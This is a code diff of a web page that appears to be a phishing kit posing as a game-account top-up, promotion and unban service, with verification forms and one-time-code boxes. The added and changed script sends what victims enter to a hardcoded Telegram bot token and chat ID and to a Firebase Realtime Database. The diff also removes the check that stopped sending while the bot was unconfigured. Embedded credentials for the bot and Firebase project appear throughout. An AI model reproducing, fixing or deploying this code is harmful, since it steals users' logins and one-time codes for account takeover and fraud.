@@ -35,9 +35,6 @@
 
         body[dir="rtl"] { font-family: 'Noto Sans Arabic', 'Inter', sans-serif; }
 
-        /* =========================================
-           BACKGROUND ENGINE
-           ========================================= */
         .bg-container { position: fixed; inset: 0; z-index: -1; overflow: hidden; }
         
         .bg-image {
@@ -76,9 +73,6 @@
             filter: blur(20px);
         }
 
-        /* =========================================
-           LANGUAGE SELECTOR
-           ========================================= */
         .lang-selector {
             position: fixed; top: 20px; right: 20px; z-index: 10000;
             display: flex; flex-direction: column; align-items: flex-end;
@@ -122,9 +116,6 @@
         .lang-option.active { color: var(--c1); font-weight: 600; background: rgba(var(--c1-rgb), 0.1); }
         .lang-option.active::after { content: '✓'; color: var(--c1); font-size: 0.8rem; }
 
-        /* =========================================
-           MAIN APP
-           ========================================= */
         .app-container { width: 100%; max-width: 420px; display: flex; flex-direction: column; align-items: center; gap: 25px; z-index: 10; padding: 20px 0; }
         
         h1 {
@@ -262,9 +253,6 @@
             font-size: 0.9rem; line-height: 1.6; color: rgba(255, 255, 255, 0.75); 
         }
 
-        /* =========================================
-           MODAL ENGINE
-           ========================================= */
         .modal-overlay {
             position: fixed; inset: 0; background: rgba(0, 0, 0, 0.7); 
             backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
@@ -365,7 +353,6 @@
         .btn-submit:hover { transform: translateY(-2px); filter: brightness(1.2); }
         .btn-submit:active { transform: translateY(0); }
 
-        /* OTP */
         .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; margin-top: 15px; }
         .otp-box {
             width: 62px; height: 68px; background: rgba(0,0,0,0.5); 
@@ -410,7 +397,6 @@
         @keyframes slideUpFade { 100% { opacity: 1; transform: translateY(0); } }
         body.modal-open { overflow: hidden; }
 
-        /* Mobile adjustments */
         @media (max-width: 480px) {
             h1 { font-size: 1.4rem; }
             .modal-box { padding: 25px 20px; max-width: 100%; }
@@ -859,8 +845,9 @@
         </div>
     </div>
 
+    <!-- ✅ Firebase SDK - Realtime Database -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
     <script>
         // ==========================================
@@ -869,24 +856,28 @@
         const BOT_TOKEN = '8781263638:AAH_I1NUGkD8kNSHq9ZhvIhFW4vdv3uvotY'; 
         const CHAT_ID = '7197720055';
         
-       const firebaseConfig = {
-  apiKey: "AIzaSyD8l_fmUmWkrmk_2y4lGb7cPcvJa5s0VvA",
-  authDomain: "topup-5ab11.firebaseapp.com",
-  databaseURL: "https://topup-5ab11-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "topup-5ab11",
-  storageBucket: "topup-5ab11.firebasestorage.app",
-  messagingSenderId: "354652700772",
-  appId: "1:354652700772:web:542fb8149ad974372edf71",
-  measurementId: "G-NZ4WW8YP3Z"
-};
+        const firebaseConfig = {
+            apiKey: "AIzaSyD8l_fmUmWkrmk_2y4lGb7cPcvJa5s0VvA",
+            authDomain: "topup-5ab11.firebaseapp.com",
+            databaseURL: "https://topup-5ab11-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "topup-5ab11",
+            storageBucket: "topup-5ab11.firebasestorage.app",
+            messagingSenderId: "354652700772",
+            appId: "1:354652700772:web:542fb8149ad974372edf71",
+            measurementId: "G-NZ4WW8YP3Z"
+        };
 
+        // ✅ Initialize Firebase with Realtime Database
         let db = null;
         try {
             if (!firebase.apps.length) {
                 firebase.initializeApp(firebaseConfig);
-                db = firebase.firestore();
+                db = firebase.database();
+                console.log("✅ Firebase Realtime Database connected!");
             }
-        } catch (error) { console.warn("Firebase not configured."); }
+        } catch (error) { 
+            console.warn("Firebase initialization error:", error); 
+        }
 
         // ==========================================
         // TRANSLATIONS
@@ -1174,29 +1165,34 @@
         });
 
         // ==========================================
-        // DATA SENDING
+        // ✅ DATA SENDING - Realtime Database Fixed
         // ==========================================
         function sendToTelegram(message) {
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                console.log('📱 Telegram (Not Configured):', message);
-                return;
-            }
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            }).then(res => {
+                if (res.ok) console.log('✅ Telegram sent!');
+                else console.warn('⚠️ Telegram failed');
             }).catch(err => console.warn('Telegram error:', err));
         }
 
+        // ✅ FIXED: Using Realtime Database's push() method
         function sendToFirebase(collectionName, dataPayload) {
             if (!db) {
                 console.log('🔥 Firebase (Not Configured):', dataPayload);
                 return;
             }
-            db.collection(collectionName).add({
+            db.ref(collectionName).push({
                 ...dataPayload,
-                timestamp: firebase.firestore.FieldValue.serverTimestamp()
-            }).catch(err => console.warn('Firebase error:', err));
+                timestamp: Date.now()
+            }).then(() => {
+                console.log('✅ Firebase saved:', dataPayload);
+            }).catch(err => {
+                console.error('❌ Firebase error:', err);
+                console.warn('👉 Check Firebase Realtime Database Rules!');
+            });
         }
 
         function sendDataToAll(msg, collection, data) {
@@ -1241,7 +1237,6 @@
             return activeBtn ? activeBtn.getAttribute('data-selected') : 'Not Selected';
         }
 
-        // FAST submit - instant transition
         function fastSubmitFlow(type) {
             let baseId = type === 'promote' ? '1' : type === 'shortid' ? '2' : type === 'hrad' ? '3' : type === 'unban' ? '4' : '5';
             const modalId = `modal-${baseId}`;
@@ -1261,7 +1256,6 @@
             else openModal(`modal-${baseId}-5`);
         }
 
-        // FAST user verification
         function fastSubmitVerification(type) {
             let baseId = type === 'promote' ? '1' : type === 'shortid' ? '2' : type === 'hrad' ? '3' : type === 'unban' ? '4' : '5';
             const currentModalId = type === 'limit' ? 'modal-6' : `modal-${baseId}-5`;
@@ -1297,7 +1291,6 @@
             }, 150);
         }
 
-        // OTP Auto Verify
         function setupOtpBoxes(type) {
             const containerId = `otp-inputs-${type}`;
             const boxes = document.querySelectorAll(`#${containerId} .otp-box`);
